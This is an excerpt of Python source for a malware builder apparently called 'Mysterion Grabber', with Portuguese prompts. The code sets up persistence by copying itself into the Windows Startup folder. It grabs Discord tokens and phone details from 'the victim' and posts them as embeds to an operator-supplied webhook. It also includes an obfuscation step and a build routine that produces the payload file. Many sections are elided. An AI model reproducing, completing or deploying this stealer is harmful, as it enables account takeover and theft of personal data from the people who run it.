...
path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/mysterionrename.pyw" % getenv("userprofile")
if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
...
class Grab:
    def token_grab(token: str):
        ...
        if not phone:
            phone = invalid
        data = [{
            "title": "Mysterion Grabber",
            "description": " A Vítima acabou de executar!",
            "url": "https://github.com/hamsterdoctor/mysterion",
            "image": {
                "url": "https://i.postimg.cc/6QvFm3CP/R.jpg"
            },
            "color": 0x196F3D,
            "fields": [
                {
        ...
        Grab.send(data)
    def send(data: str):
        data = {"username": "Mysterion",
                "avatar_url": "https://i.postimg.cc/6QvFm3CP/R.jpg",
                "embeds": data,
...
# https://github.com/hamsterdoctor/mysterion
try:        
...
class Kramer:
    def kramer(self) -> None:
        ...
        _names_ = ["_eval", "_exec", "_byte", "_bytes", "_bit", "_bits", "_system", "_encode", "_decode", "_delete", "_exit", "_rasputin", "_mysterion"]
        ...
        _final_content_ = fr"""class Mysterion():
...
class Build(Riot, Scarecrow, Kramer):
    def __init__(self, webhook: str, ping: bool) -> None:
        self.file, self.webhook, self.ping, self.content, self.key = "build/mysterionrename.pyw", webhook, ping, ..., ...
        self.build()
        return None
...
888b         d888                            ,d                            ""                            
88`8b       d8'88                            88                                                          
88 `8b     d8' 88  8b       d8  ,adPPYba,  MM88MMM  ,adPPYba,  8b,dPPYba,  88   ,adPPYba,   8b,dPPYba,   
88  `8b   d8'  88  `8b     d8'  I8[    ""    88    a8P_____88  88P'   "Y8  88  a8"     "8a  88P'   `"8a  
88   `8b d8'   88   `8b   d8'    `"Y8ba,     88    8PP"""""""  88          88  8b       d8  88       88  
88    `888'    88    `8b,d8'    aa    ]8I    88,   "8b,   ,aa  88          88  "8a,   ,a8"  88       88  
88     `8'     88      Y88'     `"YbbdP"'    "Y888  `"Ybbd8"'  88          88   `"YbbdP"'   88       88  
                       d8'                                                                               
                      d8' '''[1:]
...
def main():
    ...
    print('\n'*3)
    webhook = Write.Input("Mysterion - Enter Your Webhook -> ", 
            Colors.green, interval=0.005, input_color=Colors.white)

    if not webhook.strip():
        Colorate.Error("Mysterion - Confira a webhook!")
        return

    ping = Write.Input("Mysterion - Gostaria de receber um @everyone? [y/n] -> ", 
            Colors.green, interval=0.005, input_color=Colors.white)
    
    if ping not in ('y', 'n'):
        Colorate.Error("Sim ou não? 'y' or 'n'!")
        return
    ...
    print()
    Write.Input("Mysterion - Criado com sucesso!", Colors.green, interval=0.005)
    return exit()
